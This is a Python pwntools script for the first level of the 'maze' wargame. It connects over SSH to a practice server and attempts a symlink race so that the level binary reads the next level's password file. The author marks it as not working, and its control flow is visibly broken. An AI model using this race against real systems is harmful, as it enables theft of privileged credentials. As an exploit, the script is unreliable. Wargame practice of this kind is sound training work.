from pwn import *


# DOES NOT WORK

import time
import subprocess
from subprocess import Popen
import threading


local_dir = None
remote_binary = None
cloned_binary = None
libc = None
elf = None
def connect(level,pw):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/maze/maze"+level
    remote_binary = "/maze/maze"+level
    cloned_binary = local_dir+remote_binary
    s = ssh("maze"+level, "176.9.9.172", password=pw, cache=True, port=2225)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib32/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s

# copy script to /tmp/maze0.py and run with python3 /tmp/maze0.py6543qayxcvbn-

s = connect("0","maze0")

threads_alive = True


symlink = "/tmp/128ecf542a35ac5270a87dc740918404"
readable_symtarget = "/tmp/readable-target"
pw_symtarget = "/etc/maze_pass/maze1"


results = []


def switch_symlink_target(s):
    global threads_alive
    # p = s.process(["touch", readable_symtarget], stderr=STDOUT)
    # log.info(p.recvall())
    # p = s.process("echo -n gil > " + readable_symtarget, shell=True, stderr=STDOUT)
    # log.info(p.recvall())
    while threads_alive:
        p = s.process(["ln", "-sf", readable_symtarget, symlink], stderr=STDOUT)
        r = p.recvall()
        retcode = p.poll()
        log.info("retcode: " + str(retcode))
        if r is None:
            log.info(r)
        else:
            log.info("did not recv anything")
        p = s.process(["ln", "-sf", pw_symtarget,  symlink], stderr=STDOUT)
        r = p.recvall()
        retcode = p.poll()
        log.info("retcode: " + str(retcode))
        if r is None:
            log.info(r)
        else:
            log.info("did not recv anything")
        threads_alive = False


def run_program(s):
    global results
    global threads_alive
    while threads_alive:
        try:
            p = s.process(["/maze/maze0"], stderr=STDOUT)
            stdout = p.recvall()
            if stdout:
                log.info("stdout: " + stdout.decode("utf-8"))
                results.append(stdout)
        except Exception as err:
            print("error: {0}".format(err))
            continue


# thread1 = threading.Thread(target=switch_symlink_target, args=(s,))
# thread1.start()
# time.sleep(0.5)
#
# thread2 = threading.Thread(target=run_program, args=(s,))
# thread2.start()
switch_symlink_target(s)

# try race condition for 15 seconds
time.sleep(15)
threads_alive = False
time.sleep(1)

# remove duplicates
results = list(dict.fromkeys(results))
for e in results:
    log.info("results:  " + e.decode("utf-8"))

# hashaachon

